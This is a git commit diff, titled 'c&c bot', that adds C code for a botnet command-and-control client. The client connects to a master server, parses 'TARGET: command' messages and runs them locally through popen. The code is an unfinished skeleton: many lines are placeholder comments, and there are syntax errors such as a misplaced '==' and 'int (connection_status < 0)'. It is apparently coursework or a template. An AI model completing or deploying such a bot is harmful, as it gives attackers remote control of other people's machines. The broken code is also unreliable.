568705f49e7e86092e01fc4dfd3684c17f4b2ff0
fruitdealer <xsincerex1990@gmail.com>
2018-11-05 21:23:07 -0500

    c&c bot

--- hacking/bot/lib/connect.c
+++ hacking/bot/lib/connect.c
@@ -1,3 +1,5 @@
+#include "connect.h"
+
 int execute (int s, char *cmd) {
   //FILE must be controlled through pointer 
   FILE *f = //use popen to run the command locally
@@ -11,8 +13,45 @@ int execute (int s, char *cmd) {
 
 int parse (int s, char *msg, char* name) {
   char *target = msg;
+
+  // check wether the msg was targetted for this client if not then silently drop the packet by returning 0
+  
+  char cmd = strchr(msg, ':');
+  if (cmd == NULL) {
+    printf("Incorrect formatting reference: TARGET: command");
+    return -1;
+  }
+
+
+  //adjust command pointer to the start of the actual command 
+  // adjust the terminated character to the end of the command 
+  // print a local statement detailing what command was received
+
+  execute (s, cmd);
+  return 0;
 }
 
 int init_channel (char *ip, int port, char *name) {
-  
+  char msg[CMD_LENGTH];
+  struct sockaddr_in server;
+
+  server.sin_addr.s_addr == // convert the ip to network byte order  
+  server.sin_family = // set servers communication domain
+  server.sin_port = // convert port to network byte order
+
+  int channel = //define a SOCK_STREAM socket
+
+  if (channel < 0) {
+    perror ("Socket:");
+    exit(1);
+  } 
+
+  int (connection_status < 0) {
+    perror ("Connect:");
+    exit(1);
+  }
+
+  //send a greeting message back to master by loading a string into msg (Use printf)
+  respond (channel, msg);
+  return channel;
 }
